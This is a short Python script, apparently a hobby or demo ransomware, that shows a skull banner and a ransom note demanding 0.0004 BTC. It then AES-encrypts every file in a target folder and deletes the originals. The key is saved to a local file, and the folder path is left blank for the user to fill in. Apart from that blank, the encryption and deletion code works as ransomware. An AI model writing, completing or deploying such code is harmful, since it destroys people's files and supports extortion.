import os
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def print_skull():
    skull = r"""
          ______
       .-'      `-.
      /            \
     |              |
     |,  .-.  .-.  ,|
     | )(_o/  \o_)( |
     |/     /\     \|
     (_     ^^     _)
      \__|IIIIII|__/
       | \IIIIII/ |
       \          /
        `--------`
    """
    print(skull)

def pad(data):
    padding_length = 16 - len(data) % 16
    return data + bytes([padding_length]) * padding_length

def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_CBC)
    with open(file_path, 'rb') as f:
        data = f.read()
    padded_data = pad(data)
    ct_bytes = cipher.encrypt(padded_data)

    with open(file_path + ".encrypted", 'wb') as f:
        f.write(cipher.iv)
        f.write(ct_bytes)

    os.remove(file_path)
    print(f"Encrypted: {file_path}")

def encrypt_folder(folder_path, key):
    if not os.path.isdir(folder_path):
        print(f"Error: {folder_path} is not a directory.")
        return

    for filename in os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        if os.path.isfile(file_path):
            encrypt_file(file_path, key)

def dramatic_print(message, delay=1):
    """Function to print messages with a delay for dramatic effect."""
    for char in message:
        print(char, end='', flush=True)
        time.sleep(0.05)  
    print()  

def main():
    dramatic_print("💀 Starting ransomware... 💀", delay=2)
    time.sleep(1)
    
    print_skull()
    time.sleep(2)
    
    dramatic_print("\n💀 Your files have been encrypted! 💀")
    time.sleep(1)
    
    dramatic_print("Send 0.0004 BTC to get them back.\n")
    time.sleep(2)

    folder_to_encrypt =  #Here is where u add the path 

    key = get_random_bytes(16)  # AES-128
    with open("encryption_key.bin", "wb") as key_file:
        key_file.write(key)
    
    dramatic_print("Encrypting files...", delay=2)
    encrypt_folder(folder_to_encrypt, key)
    time.sleep(1)
    
    dramatic_print("\n✅ Encryption complete. Key saved as 'encryption_key.bin'.", delay=2)

if __name__ == "__main__":
    main()
